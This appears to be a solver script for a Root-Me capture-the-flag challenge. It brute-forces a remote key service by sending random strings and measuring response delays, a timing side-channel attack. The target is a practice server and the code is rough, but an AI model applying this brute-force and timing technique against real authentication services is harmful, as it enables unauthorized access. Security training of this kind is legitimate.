import socket
import sys
import struct
import time

#main function
if __name__ == "__main__":

    host = "challenge01.root-me.org"
    port = 51015

#create an INET, STREAMing socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error:
    print('Failed to create socket')
    sys.exit()

print('Socket Created')

try:
    remote_ip = socket.gethostbyname( host )
    s.connect((host, port))

except socket.gaierror:
    print('Hostname could not be resolved. Exiting')
    sys.exit()

print('Socket Connected to ' + host + ' on ip ' + remote_ip)


def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)

    #total data partwise in an array
    total_data=[];
    data='';

    #beginning time
    begin = time.time()
    while 1:
        #if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break

        #if you got no data at all, wait a little longer, twice the timeout
        elif time.time()-begin > timeout*2:
            break

        #recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass

    #join all parts to make final string
    return total_data[0].decode("UTF-8")


def generate(length=12):
    import random, string
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

s.send("Start".encode())
data = str(recv_timeout(s))
print(data)

massiv = []
import time, signal, sys
def signal_handler(signal, frame):
    print(massiv)
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

try:
    while True:
        recv_time = 2
        counter = time.time()
        message = generate()
        s.send(message.encode())
        data = str(recv_timeout(s, recv_time))
        if data.find("Wrong key, try again") != -1:
            counter = time.time() - counter
            if(counter > recv_time):
                print("Time=" + str(counter) + "; msg=" + message)
                massiv.append((message, counter))
        else:
            print("PASS=" + message)
except socket.error:
    print('Send failed')
    sys.exit()

s.close()